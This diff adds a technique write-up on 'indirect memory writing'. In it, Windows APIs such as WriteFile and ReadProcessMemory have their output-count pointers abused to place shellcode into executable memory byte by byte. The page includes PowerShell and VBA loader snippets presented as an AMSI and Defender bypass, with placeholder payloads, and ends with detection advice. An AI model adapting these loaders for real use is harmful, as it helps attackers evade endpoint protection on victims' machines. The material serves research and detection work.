@@ -1,0 +1,82 @@
+In local memory movement scenarios, for example, when a loader places a payload into memory for execution, antimalware can detect malicious activity at the moment the payload bytes are written into the newly allocated executable memory region. Attackers may try to evade such detection by avoiding direct writes to new memory region and instead relying on other, legitimate Windows APIs that will cause the operating system to write data to a memory location the attacker controls. This high-level approach is referred to as "indirect memory writing."
+
+Indirect memory writing leverages benign Windows APIs that accept pointer parameters used by the OS to return status or counts (for example, the number of bytes written). Because the caller supplies the pointer, an attacker who controls that pointer can cause the OS to write values into attacker-controlled memory when the API completes its operation. In effect, the API becomes a mechanism to transfer one or more bytes into a target buffer without performing an explicit memory copy from the attacker process into that buffer.
+
+Rather than invoking a direct memory-write primitive, the attacker triggers a legitimate operation whose completion or status-reporting mechanism induces write to an address the attacker chose. From a defender's perspective, this is a form of behavioral evasion, the byte stores look like normal API usage rather than an obvious memory-copy of a payload.
+
+### Example with WriteFile API
+
+When using the Windows API `WriteFile`, the call signature is 
+
+```c
+BOOL WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
+```
+
+The `nNumberOfBytesToWrite` parameter is an unsigned 32‑bit count that tells the OS how many bytes from `lpBuffer` to send to the file and on successful completion the OS writes the total number of bytes actually written into the memory pointed to by `lpNumberOfBytesWritten` (a caller‑supplied `LPDWORD`). In other words, the API uses that pointer as an output slot for a 32‑bit completion value; if you supply `nNumberOfBytesToWrite` = `0x41` and the write succeeds, the value `0x41` will be stored at the address you passed as `lpNumberOfBytesWritten`. 
+
+### AMSI Bypass
+
+For example, when scripting local shellcode loaders in VBA or PowerShell, some antimalware engines, including Microsoft Defender, may flag the payload at the moment is copied into a newly allocated executable memory region. Relying on indirect memory writting techniquevia `ReadProcessMemory` or `ReadFile` depending on the strategy, can avoid existing signatures until they are updated.
+
+#### PowerShell Example
+
+```powershell
+# ... snip ...
+
+$payload = 0xcc, 0xcc, 0xcc, 0xcc, 0xcc ...
+
+$dummy = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(256)
+try
+{	
+	for ($i = 0; $i -lt $payload.Length; $i++)
+    {                        
+        $null = [W32]::ReadProcessMemory(
+            -1,
+            $dummy,
+            $dummy,
+            $payload[$i],
+            [Int64]$payloadAddress + $i
+        )        
+    } 
+}
+finally
+{
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($dummy)
+}
+
+# ... snip ...
+```
+
+#### VBA Example
+
+```vb
+' ... snip ...
+
+Dim XORKey As Variant    
+XORKey = Array(... snip ...)
+
+Dim Payload As Variant
+#If Win64 Then
+    Payload = Array(... snip ...)
+#Else
+    Payload =  Array(... snip ...)
+#End If
+
+PayloadAddress = VirtualAlloc(0, UBound(Payload), &H3000, &H40)
+
+Dim Dummy() As Byte
+ReDim Dummy(255)
+
+Dim PayloadByte As Long 
+For i = LBound(Payload) To UBound(Payload)
+    PayloadByte = Payload(i) Xor XORKey(i Mod (UBound(XORKey) - LBound(XORKey) + 1))
+
+    ReadProcessMemory -1, Dummy(0), Dummy(0), PayloadByte, PayloadAddress + i
+Next i
+
+' ... snip ...
+```
+
+### Detection
+
+Be aware that benign APIs can be repurposed to place data into attacker‑controlled addresses. When reversing a sample (Regardless of whether the file is a binary or a script), verify whether any API that accepts a caller‑provided output pointer is being used to write into memory regions that will later be executed or otherwise abused. Instrument both the API call and the destination address (pointer provenance), and inspect the write size and value semantics. These checks will help distinguish legitimate uses from stealthy payload assembly that avoids classic `WriteProcessMemory/VirtualAlloc` patterns.
